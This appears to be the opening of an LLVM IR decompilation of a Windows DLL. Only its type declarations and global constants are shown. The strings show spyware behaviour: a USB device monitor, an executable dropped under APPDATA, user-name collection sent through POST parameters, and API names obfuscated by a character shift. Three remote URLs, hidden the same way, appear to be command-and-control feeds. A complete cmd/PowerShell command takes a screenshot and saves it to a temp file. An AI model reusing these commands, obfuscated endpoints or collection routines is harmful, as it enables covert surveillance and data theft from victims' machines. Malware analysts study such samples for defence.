source_filename = "test"
target datalayout = "e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%0 = type { i32, i32, i32, i32 }
%1 = type { i32, i32, i32, i32 }
%2 = type { i32, i32, i32, i32 }
%_RTL_CRITICAL_SECTION = type { %_RTL_CRITICAL_SECTION_DEBUG*, i32, i32, i32*, i32*, i32 }
%_RTL_CRITICAL_SECTION_DEBUG = type { i16, i16, %_RTL_CRITICAL_SECTION*, %_LIST_ENTRY, i32, i32, i32, i16, i16 }
%_LIST_ENTRY = type { %_LIST_ENTRY*, %_LIST_ENTRY* }
%vtable_1002d2d4_type = type { i32 (i8)*, i32 ()* }
%vtable_1002d2ec_type = type { i32 (i8)*, i32 ()* }
%vtable_1002d354_type = type { i32 (i8)*, i32 ()* }
%vtable_1002d36c_type = type { i32 (i8)*, i32 ()*, i32 (i32, i32)*, i32 (i32, i32)*, i32 (i32, i32)*, i32 (i32, i32)* }
%vtable_1002d394_type = type { i32 (i32)* }
%vtable_1002d3dc_type = type { i32 (i32)*, i32 ()*, i32 ()*, i32 ()*, i32 (i32)*, i32 ()*, i32 ()*, i32 ()*, i32 (i32, i32, i32)*, i32 (i32, i32, i32)*, i32 (i64, i32, i32)*, i32 (i32, i32)*, i32 (i8*, i64)*, i32 ()*, i32 (i32*)* }
%vtable_1002d41c_type = type { i32 (i32)* }
%vtable_1002d424_type = type { i32 (i32)* }
%vtable_1002d478_type = type { i32 (i32)*, i32 ()* }
%vtable_1002d494_type = type { i32 (i32)*, i32 ()* }
%vtable_1002d4ac_type = type { i32 (i32)*, i32 ()* }
%vtable_1002dfbc_type = type { i32 (i8)*, i32 ()*, i32 ()*, i32 (i32, i32, i32, i32, i32, i32)*, i32 (i32, i32, i32, i32, i32, i64)*, i32 (i32, i32, i32, i32, i32, i64)*, i32 (i32, i32, i32, i32, i32, i32, i32)*, i32 (i32, i32, i32, i32, i32, i32, i32)*, i32 (i32, i32, i32, i32, i32, i32)*, i32 (i32, i32, i32, i32, i32, i32)*, i32 (i32, i32, i32, i32, i8, i8)* }
%vtable_1002dfec_type = type { i32 (i8)*, i32 ()*, i32 ()*, i32 ()*, i32 ()*, i32 (i32)*, i32 (i32)*, i32 (i32)* }
%vtable_10030550_type = type { i32 (i32)* }
%vtable_1003055c_type = type { i32 (i32)*, i32 ()* }
%_SECURITY_ATTRIBUTES = type { i32, i32*, i1 }
%_OVERLAPPED = type { i32, i32, i32, i32* }
%_SYSTEMTIME = type { i16, i16, i16, i16, i16, i16, i16, i16 }
%tagRECT = type { i32, i32, i32, i32 }
%_IO_FILE = type { i32 }
%tagINPUT = type { i32, i32 }
%tagRAWINPUTDEVICELIST = type { i32*, i32 }
%lconv = type { i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8, i8, i8, i8, i8, i8, i8, i8, i8, i8, i8, i8, i8, i8 }
%addrinfo = type { i32, i32, i32, i32, i32, i8*, %sockaddr*, %addrinfo* }
%sockaddr = type { i16, [14 x i8] }
%in_addr = type { i32 }
%_OSVERSIONINFOW = type { i32, i32, i32, i32, i32, [128 x i16] }
%_WIN32_FIND_DATAW = type { i32, %_FILETIME, %_FILETIME, %_FILETIME, i32, i32, i32, i32, [1 x i16], [14 x i16], i32, i32, i16 }
%_FILETIME = type { i32, i32 }
%_STARTUPINFOW = type { i32, i16*, i16*, i16*, i32, i32, i32, i32, i32, i32, i32, i32, i16, i16, i8*, i32*, i32*, i32* }
%_PROCESS_INFORMATION = type { i32*, i32*, i32, i32 }
%hostent = type { i8*, i8**, i16, i16, i8** }
%_EXCEPTION_RECORD = type { i32, i32, %_EXCEPTION_RECORD*, i32*, i32, [1 x i32] }

@0 = external local_unnamed_addr global i32
@global_var_10040a18 = global i32 0
@global_var_10040a28 = local_unnamed_addr global i32 0
@global_var_10040a2c = local_unnamed_addr global i32 0
@global_var_1003df79 = local_unnamed_addr global i32 0
@global_var_10040a30 = global i32 0
@global_var_10039158 = constant [18 x i8] c"Unknown exception\00"
@global_var_1002d2e0 = constant i32 268440192
@global_var_1003916c = constant [9 x i8] c"bad cast\00"
@global_var_1003d070 = local_unnamed_addr global i32 -1153374642
@global_var_10039178 = constant [16 x i8] c"bad locale name\00"
@global_var_1003bd64 = local_unnamed_addr constant i32 0
@global_var_1002d2f8 = constant i32 268440832
@global_var_1002d308 = constant i32 268441712
@global_var_1002d338 = constant i32 268441808
@global_var_10039198 = constant [3 x i8] c": \00"
@global_var_1002d360 = constant i32 268442608
@global_var_1003919c = constant [9 x i8] c"iostream\00"
@global_var_100391a8 = constant [22 x i8] c"iostream stream error\00"
@global_var_1002d388 = constant i32 268442608
@global_var_100391c0 = constant [21 x i8] c"ios_base::badbit set\00"
@global_var_1003be24 = constant i32 0
@global_var_100391d8 = constant [22 x i8] c"ios_base::failbit set\00"
@global_var_100391f0 = constant [21 x i8] c"ios_base::eofbit set\00"
@global_var_1003ff30 = global i32 0
@global_var_1003ff34 = local_unnamed_addr global i32 0
@global_var_1003ff38 = local_unnamed_addr global i32 0
@global_var_1003ff3a = local_unnamed_addr global i32 0
@global_var_1003ff40 = local_unnamed_addr global i32 0
@global_var_1003ff44 = local_unnamed_addr global i32 0
@global_var_1003ff48 = local_unnamed_addr global i32 0
@global_var_10040024 = local_unnamed_addr global i32 0
@global_var_100398f0 = local_unnamed_addr constant [8 x i16] %wide-string
@global_var_1003d9b0 = local_unnamed_addr global i32 -1
@global_var_10040020 = global i32 0
@global_var_10040034 = local_unnamed_addr global i32 0
@global_var_1003f508 = local_unnamed_addr global i32 0
@global_var_1003d9b4 = global i32 65279
@global_var_10039208 = constant [40 x i16] %wide-string
@global_var_1003ed0a = global i32 0
@global_var_10002e90 = local_unnamed_addr constant i32 268445701
@global_var_10039258 = constant i32 32
@global_var_100398e0 = local_unnamed_addr constant [8 x i16] %wide-string
@global_var_1003925c = constant i32 43
@global_var_10039260 = constant i32 45
@global_var_10039264 = constant i32 48
@global_var_10039268 = constant i32 49
@global_var_1003926c = constant i32 50
@global_var_10039270 = constant i32 51
@global_var_10039274 = constant i32 52
@global_var_10039278 = constant i32 53
@global_var_1003927c = constant i32 54
@global_var_10039280 = constant i32 55
@global_var_10039284 = constant i32 56
@global_var_10039288 = constant i32 57
@global_var_1003928c = constant i32 42
@global_var_10039290 = constant i32 46
@global_var_10039294 = constant i32 47
@global_var_1004002c = global i32 0
@global_var_10039298 = constant [13 x i8] c"kernel32.dll\00"
@global_var_1003ed04 = local_unnamed_addr global i32 0
@global_var_100392a8 = local_unnamed_addr constant [7 x i16] %wide-string
@global_var_10039154 = constant i32 0
@global_var_1003ff2c = local_unnamed_addr global i32 0
@global_var_10040938 = local_unnamed_addr global i32 0
@global_var_1003f50c = local_unnamed_addr global i32 0
@global_var_1003ed00 = local_unnamed_addr global i32 0
@global_var_1003ff28 = local_unnamed_addr global i32 0
@global_var_10040030 = local_unnamed_addr global i32 0
@global_var_10040028 = local_unnamed_addr global i32 0
@global_var_100392e0 = constant [8 x i8] c"APPDATA\00"
@global_var_100392f4 = constant i32 100
@global_var_100392f8 = constant i32 101
@global_var_100392fc = constant i32 102
@global_var_10039300 = constant i32 103
@global_var_10039304 = constant i32 104
@global_var_10039308 = constant i32 105
@global_var_1003930c = constant i32 106
@global_var_10039310 = constant i32 107
@global_var_100392b8 = constant [35 x i8] c":\5CSystem Volume Information\5Cconfig\00"
@global_var_100392dc = constant [3 x i8] c"rb\00"
@global_var_10039314 = local_unnamed_addr constant [44 x i8] c" The file is present but old replacing file\00"
@global_var_10039340 = local_unnamed_addr constant [19 x i8] c"USB Device Lister.\00"
@global_var_10039354 = local_unnamed_addr constant [20 x i8] c"Inserted the Device\00"
@global_var_10039368 = local_unnamed_addr constant [19 x i8] c"removed the device\00"
@global_var_1003df80 = global i32 0
@global_var_1003dfb8 = global i32 0
@global_var_1003df8c = global i32 0
@global_var_1003dfbc = global i32 0
@global_var_1003937c = constant [3 x i8] c"%p\00"
@global_var_10039380 = constant [3 x i8] c"Lu\00"
@global_var_10039384 = constant [3 x i8] c"Ld\00"
@global_var_10039388 = constant [3 x i8] c"lu\00"
@global_var_1003938c = constant [3 x i8] c"ld\00"
@global_var_10039390 = constant [16 x i8] c"string too long\00"
@global_var_100393a0 = constant [3 x i8] c"eE\00"
@global_var_100393a4 = constant [3 x i8] c"pP\00"
@global_var_100393a8 = constant [24 x i8] c"invalid string position\00"
@global_var_1003e058 = local_unnamed_addr global i32 0
@global_var_10040a40 = local_unnamed_addr global i32 0
@global_var_1003e03c = local_unnamed_addr global i32 0
@global_var_1003bdd0 = constant i32 0
@global_var_1003e578 = local_unnamed_addr global i32 0
@global_var_10040a48 = global i32 0
@global_var_10040a4c = local_unnamed_addr global i32 0
@global_var_100392e8 = constant [10 x i8] c"\5Ccoco.exe\00"
@global_var_1003dfa4 = global i32 0
@global_var_1003dfa0 = global i32 0
@global_var_1003df94 = global i32 0
@global_var_10040a44 = local_unnamed_addr global i32 0
@global_var_10040a3c = local_unnamed_addr global i32 0
@global_var_10040a54 = local_unnamed_addr global i32 0
@global_var_10040a38 = local_unnamed_addr global i32 0
@global_var_10039188 = constant [6 x i8] c"false\00"
@global_var_10039190 = constant [5 x i8] c"true\00"
@global_var_100393c0 = constant [4 x i8] c"%d\0A\00"
@global_var_1003d9e0 = global [13 x i8] c"lfsofm43/emm\00"
@global_var_1003d9e4 = local_unnamed_addr global [9 x i8] c"fm43/emm\00"
@global_var_1003d9e8 = local_unnamed_addr global [5 x i8] c"/emm\00"
@global_var_1003d9ec = local_unnamed_addr global i32 0
@global_var_10040950 = local_unnamed_addr global i32 0
@global_var_100393c4 = constant [5 x i8] c"%02x\00"
@global_var_100393d4 = local_unnamed_addr constant [5 x i8] c"assd\00"
@global_var_100393cc = local_unnamed_addr constant [13 x i8] c"asdzzfg.assd\00"
@global_var_100393d8 = local_unnamed_addr constant i32 0
@global_var_1004094c = local_unnamed_addr global i32 0
@global_var_100393dc = local_unnamed_addr constant [13 x i8] c"CreateThread\00"
@global_var_100393ec = constant [13 x i8] c"DMCZ0001.dat\00"
@global_var_1003d9c8 = constant [23 x i8] c"ouemm/emm!!!!!!!!!!!!!\00"
@global_var_1003d9b8 = constant [13 x i8] c"bewbqj43/emm\00"
@global_var_100409b8 = global i32 0
@global_var_100409bc = local_unnamed_addr global i32 0
@global_var_100409c0 = local_unnamed_addr global i32 0
@global_var_100409c4 = local_unnamed_addr global i32 0
@global_var_1004095c = local_unnamed_addr global i32 0
@global_var_10040960 = local_unnamed_addr global i32 0
@global_var_10040964 = local_unnamed_addr global i32 0
@global_var_10040968 = local_unnamed_addr global i32 0
@global_var_100393fc = constant [14 x i8] c"SfhPqfoLfzFyX\00"
@global_var_1003940c = constant [15 x i8] c"SfhTfuWbmvfFyX\00"
@global_var_1003941c = constant [5 x i8] c"juds\00"
@global_var_10039424 = constant [5 x i16] %wide-string
@global_var_10039430 = constant [5 x i8] c"uid=\00"
@global_var_10039438 = local_unnamed_addr constant [4 x i8] c"&u=\00"
@global_var_1003943c = constant [13 x i8] c"GetUserNameW\00"
@global_var_1003944c = constant [5 x i8] c"%04x\00"
@global_var_10039454 = constant [5 x i8] c"UNIC\00"
@global_var_1003945c = constant i32 63
@global_var_10039900 = local_unnamed_addr constant [8 x i16] %wide-string
@global_var_10039468 = constant [67 x i8] c"iuuqt;00sbx/hjuivcvtfsdpoufou/dpn0ib{lbcffc0uftuib{0nbtufs0ynm/ynm\00"
@global_var_100394ac = constant [40 x i8] c"iuuqt;00gffe54/dpn05752442876352729/ynm\00"
@global_var_100394d4 = constant [40 x i8] c"iuuqt;00gffe54/dpn09938769841477682/ynm\00"
@global_var_10039910 = local_unnamed_addr constant [16 x i8] c"wininet.dll    \00"
@global_var_100409ec = local_unnamed_addr global i32 0
@global_var_10040954 = local_unnamed_addr global i32 0
@global_var_1004093c = local_unnamed_addr global i32 0
@global_var_100409e4 = local_unnamed_addr global i32 0
@global_var_10040948 = local_unnamed_addr global i32 0
@global_var_100409b4 = local_unnamed_addr global i32 0
@global_var_10040980 = local_unnamed_addr global i32 0
@global_var_100409e8 = local_unnamed_addr global i32 0
@global_var_10040984 = local_unnamed_addr global i32 0
@global_var_10039510 = local_unnamed_addr constant [5 x i8] c"/emm\00"
@global_var_10039508 = local_unnamed_addr constant [13 x i8] c"lfsofm43/emm\00"
@global_var_10039514 = local_unnamed_addr constant i32 0
@global_var_10039518 = constant [12 x i8] c"FreeLibrary\00"
@global_var_10039524 = constant [19 x i16] %wide-string
@global_var_100394fc = constant [5 x i16] %wide-string
@global_var_10039980 = local_unnamed_addr constant [16 x i8] c"form-urlencoded\00"
@global_var_10039560 = local_unnamed_addr constant [8 x i16] %wide-string
@global_var_10039570 = constant [3 x i8] c"{{\00"
@global_var_10039574 = constant [3 x i8] c"}}\00"
@global_var_1003954c = constant [8 x i8] c"http://\00"
@global_var_10039554 = constant [9 x i8] c"https://\00"
@global_var_100409e0 = local_unnamed_addr global i32 0
@global_var_10039578 = constant [5 x i8] c"&r=1\00"
@global_var_10039580 = constant [14 x i8] c"404 Not Found\00"
@global_var_10039590 = constant [10 x i8] c"WriteFile\00"
@global_var_1003959c = constant [12 x i8] c"CreateFileW\00"
@global_var_10040944 = local_unnamed_addr global i32 0
@global_var_100395a8 = constant [3 x i8] c"||\00"
@global_var_100395ac = constant [4 x i8] c"&yy\00"
@global_var_100395b0 = constant [3 x i8] c"=1\00"
@global_var_100395b4 = constant [4 x i8] c"&tt\00"
@global_var_100395b8 = constant [4 x i8] c"&zz\00"
@global_var_100395c0 = constant [3 x i16] %wide-string
@global_var_10040940 = local_unnamed_addr global i32 0
@global_var_100395d0 = constant [731 x i8] c"cmd.exe /c  powershell.exe function Take-Screenshot() {Add-Type -AssemblyName System.Windows.Forms;Add-type -AssemblyName System.Drawing;$FileName='TPX499.dat';$outfile=join-path $env:temp $FileName ;   [int]$PrtScrnWidth = (gwmi Win32_VideoController).CurrentHorizontalResolution;    [int]$PrtScrnHeight = (gwmi Win32_VideoController).CurrentVerticalResolution;    $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, $PrtScrnWidth, $PrtScrnHeight);    $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height;    $graphics = [Drawing.Graphics]::FromImage($bmp);    $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size);    $bmp.Save($outfile);    $graphics.Dispose();    $bmp.Dispose();}Take-Screenshot\00"
@global_var_100395c8 = constant [6 x i8] c"POST \00"
@global_var_100398ac = constant [8 x i8] c"dpoofdu\00"
@global_var_100398b4 = constant [8 x i8] c"connect\00"
@global_var_1003e044 = local_unnamed_addr global i32 0
@global_var_10030500 = constant [33 x i16] %wide-string
@global_var_1002e00c = constant [13 x i16] %wide-string
@global_var_1002e24c = constant [28 x i8] c"InitializeConditionVariable\00"
@global_var_1002e29c = constant [25 x i8] c"SleepConditionVariableCS\00"
@global_var_1002e280 = constant [25 x i8] c"WakeAllConditionVariable\00"
@global_var_1003e224 = local_unnamed_addr global i32 0
@global_var_1003e220 = global i32 0
@global_var_1003e228 = local_unnamed_addr global i32 0
@global_var_1003e22c = local_unnamed_addr global i32 0
@global_var_1003e554 = global i32 0
@global_var_1003e560 = global i32 0
@global_var_1003b5b0 = constant i32 -2
@global_var_1003e54c = local_unnamed_addr global i32 0
@global_var_1002d2a0 = constant i32 0
@global_var_1002d284 = constant i32 0
@global_var_1002d280 = constant i32 0
@global_var_1002d254 = constant i32 0
@global_var_1003e570 = local_unnamed_addr global i32 0
@global_var_1003b5d0 = constant i32 -2
@global_var_1003e574 = local_unnamed_addr global i32 0
@global_var_1003e57c = local_unnamed_addr global i32 0
@global_var_1003d080 = local_unnamed_addr global i32 1
@global_var_1003e580 = local_unnamed_addr global i32 0
@global_var_10040a5c = local_unnamed_addr global i32 0
@global_var_1003e588 = global i32 0
@global_var_1003e590 = global i32 0
@global_var_10040a58 = global i32 0
@global_var_1003e5e4 = local_unnamed_addr global i32 0
@global_var_100305bc = external constant i32
@global_var_100305c8 = local_unnamed_addr constant [30 x i16] %wide-string
@global_var_10030604 = local_unnamed_addr constant [29 x i16] %wide-string
@global_var_10030640 = local_unnamed_addr constant [9 x i16] %wide-string
@global_var_10030654 = constant [8 x i16] %wide-string
@global_var_10030664 = constant [8 x i16] %wide-string
@global_var_1003e5a8 = global i32 0
@global_var_1003067c = constant i32 0
@global_var_10030674 = constant i32 0
@global_var_1002e028 = constant [9 x i8] c"FlsAlloc\00"
@global_var_10030684 = constant i32 0
@global_var_1002e034 = constant [8 x i8] c"FlsFree\00"
@global_var_1003068c = constant i32 0
@global_var_1002e03c = constant [12 x i8] c"FlsGetValue\00"
@global_var_1002e048 = constant [12 x i8] c"FlsSetValue\00"
@global_var_1003069c = constant i32 0
@global_var_1002e054 = constant [28 x i8] c"InitializeCriticalSectionEx\00"
@global_var_1003e5bc = global i32 0
@global_var_1003d090 = local_unnamed_addr global i32 -1
@global_var_1002d250 = local_unnamed_addr constant i32 268453488
@global_var_1003d0a0 = local_unnamed_addr global i32 429065504
@global_var_1003b7a8 = constant i32 -2
@global_var_1003b788 = constant i32 -28
@global_var_1003e640 = global i32 0
@global_var_1003e644 = local_unnamed_addr global i32 0
@global_var_1003e8d0 = local_unnamed_addr global i32 0
@global_var_1003e8dc = global i32 0
@global_var_1002d2bc = constant i32 0
@global_var_1002d2ac = constant i32 0
@global_var_1002d2c4 = constant i32 0
@global_var_1002d2c0 = constant i32 0
@global_var_1003b868 = constant i32 -2
@global_var_1003e650 = local_unnamed_addr global i32 0
@global_var_1003b8a8 = constant i32 -2
@global_var_1003b8c8 = constant i32 -2
@global_var_1003e658 = local_unnamed_addr global i32 0
@global_var_1003e654 = local_unnamed_addr global i32 0
@global_var_1003b8e8 = constant i32 -2
@global_var_1003b948 = constant i32 -2
@global_var_1003b968 = constant i32 -2
@global_var_1003e65c = local_unnamed_addr global i32 0
@global_var_1003b9a8 = constant i32 -2
@global_var_1003ebf4 = local_unnamed_addr global i32 0
@global_var_10032250 = local_unnamed_addr constant [4 x i8] c"pow\00"
@global_var_10033280 = local_unnamed_addr constant i32 0
@global_var_1003ba28 = constant i32 -2
@global_var_1003ba08 = constant i32 -2
@global_var_1003d778 = global i32 0
@global_var_10032378 = constant [4 x i8] c"ccs\00"
@global_var_10032300 = constant i32 268547781
@global_var_1003baa8 = constant i32 -2
@global_var_1003bae8 = constant i32 -2
@global_var_1003bb08 = constant i32 -2
@global_var_1003bac8 = constant i32 -2
@global_var_1003bb48 = constant i32 -2
@global_var_1003e8e8 = global i32 0
@global_var_1003bb88 = constant i32 -2
@global_var_1003bba8 = constant i32 -2
@global_var_1003bb68 = constant i32 -2
@global_var_1003eafc = local_unnamed_addr global i32 0
@global_var_10031380 = constant i32 2097184
@global_var_1003d320 = global i32* @global_var_10031380
@global_var_1003eaf8 = local_unnamed_addr global i32 0
@global_var_1003d0b0 = local_unnamed_addr global i32 46
@global_var_1003e649 = local_unnamed_addr global i32 0
@global_var_1003107a = local_unnamed_addr constant i32 2097184
@global_var_1003d318 = local_unnamed_addr global i32 1
@global_var_1003bbc8 = constant i32 -2
@global_var_1003ebd8 = local_unnamed_addr global i32 0
@global_var_1003bc08 = constant i32 -2
@global_var_1003ebdc = local_unnamed_addr global i32 0
@global_var_1003ebe0 = local_unnamed_addr global i32 0
@global_var_1003bc68 = constant i32 -2
@global_var_1003ebec = local_unnamed_addr global i32 0
@global_var_10040a64 = local_unnamed_addr global i32 0
@global_var_100332a6 = local_unnamed_addr constant i32 0
@global_var_1003bca8 = constant i32 -2
@global_var_1003ecbc = local_unnamed_addr global i32 0
@global_var_1003ecc0 = local_unnamed_addr global i32 0
@global_var_1003ecf4 = local_unnamed_addr global i32 0
@global_var_100387c0 = local_unnamed_addr constant [6 x i8] c"log10\00"
@global_var_1003ac08 = local_unnamed_addr constant i32 429065506
@global_var_1003ac34 = local_unnamed_addr constant i32 429065506
@global_var_1003ac68 = local_unnamed_addr constant i32 429065506
@global_var_1003deb0 = local_unnamed_addr global i32 0
@global_var_1003dfd0 = local_unnamed_addr global i32 0
@global_var_1003df78 = local_unnamed_addr global i32 0
@global_var_1003e064 = local_unnamed_addr global i32 0
@global_var_1003e05c = local_unnamed_addr global i32 0
@global_var_1003e0e9 = local_unnamed_addr global i32 0
@global_var_1003e0e8 = local_unnamed_addr global i32 0
@1 = external global i32
@global_var_10039150 = external constant i8*
@global_var_10039c00 = external local_unnamed_addr constant i128
@global_var_10039aa0 = external local_unnamed_addr constant i128
@global_var_10039b50 = external local_unnamed_addr constant i128
@global_var_10039c60 = external local_unnamed_addr constant i128
@global_var_1003fd10 = global i16* null
@global_var_10039b60 = external local_unnamed_addr constant i128
@global_var_1003f510 = global i16* null
@global_var_10040038 = global i16* null
@global_var_1003ff18 = global i16 0
@global_var_1003ff24 = local_unnamed_addr global i16 0
@global_var_1003ff22 = local_unnamed_addr global i16 0
@global_var_1003ff20 = local_unnamed_addr global i16 0
@global_var_1003ff1e = local_unnamed_addr global i16 0
@global_var_1003ff1a = local_unnamed_addr global i16 0
@global_var_1003ed08 = global i16* null
@global_var_10039920 = external local_unnamed_addr constant i128
@global_var_10039940 = external local_unnamed_addr constant i128
@global_var_10039950 = external local_unnamed_addr constant i128
@global_var_10039930 = external local_unnamed_addr constant i128
@global_var_10039960 = external local_unnamed_addr constant i128
@global_var_10039ae0 = external local_unnamed_addr constant i128
@global_var_10039b20 = external local_unnamed_addr constant i128
@global_var_10039a40 = external local_unnamed_addr constant i128
@global_var_10039af0 = external local_unnamed_addr constant i128
@global_var_10039b00 = external local_unnamed_addr constant i128
@global_var_1003dfc0 = external global i8*
@global_var_10039c90 = external local_unnamed_addr constant i128
@global_var_100398d8 = external local_unnamed_addr constant i128
@global_var_10040a50 = global void ()* null
@global_var_10039c70 = external local_unnamed_addr constant i128
@global_var_10039990 = external local_unnamed_addr constant i128
@global_var_10039bc0 = external local_unnamed_addr constant i128
@global_var_100399d0 = external local_unnamed_addr constant i128
@global_var_10039c40 = external local_unnamed_addr constant i128
@global_var_10039a90 = external local_unnamed_addr constant i128
@global_var_100399e0 = external local_unnamed_addr constant i128
@global_var_10039a00 = external local_unnamed_addr constant i128
@global_var_100399b0 = external local_unnamed_addr constant i128
@global_var_10039ba0 = external local_unnamed_addr constant i128
@global_var_10040958 = global i16* null
@2 = internal constant [14 x i8] c"MWuFQPJLM\7FqVM\00"
@global_var_100398bc = constant i8* getelementptr inbounds ([14 x i8], [14 x i8]* @2, i32 0, i32 0)
@global_var_10039a80 = external local_unnamed_addr constant i128
@global_var_10039a20 = external local_unnamed_addr constant i128
@global_var_10039bd0 = external local_unnamed_addr constant i128
@global_var_10039458 = local_unnamed_addr constant i8 0
@global_var_10039460 = local_unnamed_addr constant i16 38
@global_var_10039464 = constant i16 61
@global_var_10039be0 = external local_unnamed_addr constant i128
@global_var_100399a0 = external local_unnamed_addr constant i128
@global_var_10039ac0 = external local_unnamed_addr constant i128
@global_var_10039b70 = external local_unnamed_addr constant i128
@global_var_10039ab0 = external local_unnamed_addr constant i128
@global_var_10039b90 = external local_unnamed_addr constant i128
@global_var_10039a10 = external local_unnamed_addr constant i128
@global_var_10039b40 = external local_unnamed_addr constant i128
@global_var_10039a50 = external local_unnamed_addr constant i128
@global_var_10039a60 = external local_unnamed_addr constant i128
@global_var_10039bf0 = external local_unnamed_addr constant i128
@global_var_10039b30 = external local_unnamed_addr constant i128
@global_var_10039a70 = external local_unnamed_addr constant i128
@global_var_10039b80 = external local_unnamed_addr constant i128
@global_var_10039c10 = external local_unnamed_addr constant i128
@global_var_10039c30 = external local_unnamed_addr constant i128
@global_var_10039ad0 = external local_unnamed_addr constant i128
@global_var_10039c20 = external local_unnamed_addr constant i128
@global_var_100399f0 = external local_unnamed_addr constant i128
@global_var_10039a30 = external local_unnamed_addr constant i128
@global_var_100399c0 = external local_unnamed_addr constant i128
@global_var_10039c80 = external local_unnamed_addr constant i128
@global_var_10039b10 = external local_unnamed_addr constant i128
@global_var_10039c50 = external local_unnamed_addr constant i128
@global_var_10039bb0 = external local_unnamed_addr constant i128
@global_var_10039970 = external local_unnamed_addr constant i128
@global_var_1003957c = local_unnamed_addr constant i8 0
@global_var_1003e208 = global %_RTL_CRITICAL_SECTION* null
@global_var_1003e56c = local_unnamed_addr global i8 0
@global_var_1003e59c = global i16* null
@global_var_10030694 = constant %_RTL_CRITICAL_SECTION* inttoptr (i32 1 to %_RTL_CRITICAL_SECTION*)
@global_var_1003e648 = local_unnamed_addr global i8 0
@global_var_1003d3e4 = local_unnamed_addr global i8 -2
@global_var_10033220 = local_unnamed_addr constant x86_fp80 0xK7FFF8000000000000000
@global_var_10032254 = local_unnamed_addr constant double 5.000000e-01
@global_var_1003d3e0 = global i16* inttoptr (i32 67 to i16*)
@global_var_10033170 = external local_unnamed_addr constant i128
@global_var_10033180 = external local_unnamed_addr constant i128
@global_var_10034f38 = constant i64* null
@global_var_10035350 = constant i128* null
@global_var_100331c8 = local_unnamed_addr constant i64 -134217728
@global_var_10035b60 = constant i64* null
@global_var_10035f70 = constant i128* null
@global_var_100331d0 = local_unnamed_addr constant i64 -4614195897457180672
@global_var_10036780 = constant i64* inttoptr (i32 1073741824 to i64*)
@global_var_10036f90 = constant i128* null
@global_var_10037fa0 = external local_unnamed_addr constant i128
@global_var_10037fb0 = external local_unnamed_addr constant i128
@global_var_10033160 = local_unnamed_addr constant i64 4843621399236968448
@global_var_10037fc0 = constant i128* null
@global_var_100331a0 = external local_unnamed_addr constant i128
@global_var_100331c0 = local_unnamed_addr constant i64 4604418534313441775
@global_var_100331b0 = external local_unnamed_addr constant i128
@global_var_10033190 = external local_unnamed_addr constant i128
@global_var_100331f0 = local_unnamed_addr constant double -0.000000e+00
@global_var_100331e8 = local_unnamed_addr constant double 0xFFF0000000000000
@global_var_100331d8 = local_unnamed_addr constant i64 9218868437227405313
@global_var_10033210 = local_unnamed_addr constant i64 -2251799813685248
@global_var_100331e0 = local_unnamed_addr constant double 0x7FF0000000000000
@global_var_10033208 = local_unnamed_addr constant i64 4503599627370496
@global_var_100331f8 = local_unnamed_addr constant i64 -9007199254740992
@global_var_10033200 = local_unnamed_addr constant i64 9214364837600034816
@global_var_1003322a = local_unnamed_addr constant x86_fp80 0xKFFFF8000000000000000
@global_var_1003323e = local_unnamed_addr constant x86_fp80 0xK400DFFFF000000000000
@global_var_10033252 = local_unnamed_addr constant double 5.000000e-01
@global_var_1003329e = local_unnamed_addr constant double 1.000000e+00
@global_var_10033294 = local_unnamed_addr constant x86_fp80 0xK3FFEC90FD7E45803CD14
@global_var_10038830 = external local_unnamed_addr constant i128
@global_var_10038840 = external local_unnamed_addr constant i128
@global_var_100388a0 = external local_unnamed_addr constant i128
@global_var_10038850 = external local_unnamed_addr constant i128
@global_var_10038860 = external local_unnamed_addr constant i128
@global_var_10038d40 = constant i128* null
@global_var_10038930 = constant i128* null
@global_var_100388f0 = external local_unnamed_addr constant i128
@global_var_10038900 = external local_unnamed_addr constant i128
@global_var_10038910 = external local_unnamed_addr constant i128
@global_var_10038870 = external local_unnamed_addr constant i128
@global_var_10038880 = constant i128* null
@global_var_10038920 = external local_unnamed_addr constant i128
@global_var_100388b0 = external local_unnamed_addr constant i128
@global_var_100388d8 = local_unnamed_addr constant double 0x7FF0000000000000
@global_var_100388d0 = local_unnamed_addr constant i64 -4503599627370496
@global_var_100388c0 = local_unnamed_addr constant i64 4841369599423283200
@global_var_1002d2d4 = constant %vtable_1002d2d4_type { i32 (i8)* @function_10001280, i32 ()* @function_10001270 }
@global_var_1002d2ec = constant %vtable_1002d2ec_type { i32 (i8)* @function_10001280, i32 ()* @function_10001270 }
@global_var_1002d354 = constant %vtable_1002d354_type { i32 (i8)* @function_10001bf0, i32 ()* @function_10001270 }
@global_var_1002d36c = constant %vtable_1002d36c_type { i32 (i8)* @function_100018d0, i32 ()* @function_10001d60, i32 (i32, i32)* @function_10001d70, i32 (i32, i32)* @function_10001930, i32 (i32, i32)* @function_10001990, i32 (i32, i32)* @function_10001950 }
@vtable_1002d394 = local_unnamed_addr global %vtable_1002d394_type { i32 (i32)* @"??_Gios_base@std@@UAEPAXI@Z" }
@vtable_1002d3dc = local_unnamed_addr global %vtable_1002d3dc_type { i32 (i32)* @"??_G?$basic_filebuf@DU?$char_traits@D@std@@@std@@UAEPAXI@Z", i32 ()* @"?_Lock@?$basic_filebuf@DU?$char_traits@D@std@@@std@@UAEXXZ", i32 ()* @"?_Lock@?$basic_filebuf@DU?$char_traits@D@std@@@std@@UAEXXZ.3", i32 ()* @function_1000da45, i32 (i32)* @"?pbackfail@?$basic_filebuf@DU?$char_traits@D@std@@@std@@MAEHH@Z", i32 ()* @function_1000de94, i32 ()* @"?underflow@?$basic_filebuf@DU?$char_traits@D@std@@@std@@MAEHXZ", i32 ()* @function_1000ded4, i32 (i32, i32, i32)* @function_1000e0ef, i32 (i32, i32, i32)* @function_1000e1dd, i32 (i64, i32, i32)* @"?seekoff@?$basic_filebuf@DU?$char_traits@D@std@@@std@@MAE?AV?$fpos@U_Mbstatet@@@2@_JHH@Z", i32 (i32, i32)* @"?seekpos@?$basic_filebuf@DU?$char_traits@D@std@@@std@@MAE?AV?$fpos@U_Mbstatet@@@2@V32@H@Z", i32 (i8*, i64)* @"?setbuf@?$basic_filebuf@DU?$char_traits@D@std@@@std@@MAEPAV?$basic_streambuf@DU?$char_traits@D@std@@@2@PAD_J@Z", i32 ()* @"?sync@?$basic_filebuf@DU?$char_traits@D@std@@@std@@MAEHXZ", i32 (i32*)* @"?imbue@?$basic_filebuf@DU?$char_traits@D@std@@@std@@MAEXABVlocale@2@@Z" }
